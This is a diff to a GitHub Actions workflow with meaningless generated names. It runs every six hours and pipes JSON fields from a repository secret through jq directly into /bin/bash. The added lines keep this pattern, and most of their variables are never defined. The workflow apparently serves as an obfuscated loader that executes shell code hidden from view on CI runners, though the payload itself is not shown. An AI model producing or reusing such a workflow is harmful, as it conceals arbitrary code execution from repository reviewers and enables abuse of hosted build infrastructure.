@@ -1,8 +1,10 @@
 name: humoxi8192
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
+    - cron: '3 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +13,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: humoxi8192
         env:
-          qel3: ${{ secrets.qel3 }}
+          diz06: ${{ secrets.diz06 }}
         run: |
-          echo $qel3 | jq -r .utp5 | /bin/bash
-          echo $hi13291 | jq -r .ugsai0 | /bin/bash
-          echo $rsp7941 | jq -r .jor8 | /bin/bash
-          echo $vfb51 | jq -r .utv83 | /bin/bash
-          echo $v9 | jq -r .aql9 | /bin/bash
-          echo $pajn89 | jq -r .dpde40 | /bin/bash
-          echo $a465 | jq -r .a04 | /bin/bash
-          echo $wm5 | jq -r .kispl244 | /bin/bash
-          echo $gock5370 | jq -r .i850 | /bin/bash
-          echo $x7244 | jq -r .oxrhg39997 | /bin/bash
-          echo $dd533 | jq -r .cpf6068 | /bin/bash
-          echo $haip0949 | jq -r .tnq7 | /bin/bash
-          echo $tt94341 | jq -r .bua7 | /bin/bash
+          echo $diz06 | jq -r .hdu96944 | /bin/bash
+          echo $l99132 | jq -r .z90435 | /bin/bash
+          echo $gjs5904 | jq -r .zkn7 | /bin/bash
+          echo $f7854 | jq -r .bhnrm643 | /bin/bash
+          echo $dbkst039 | jq -r .tziq52610 | /bin/bash
 
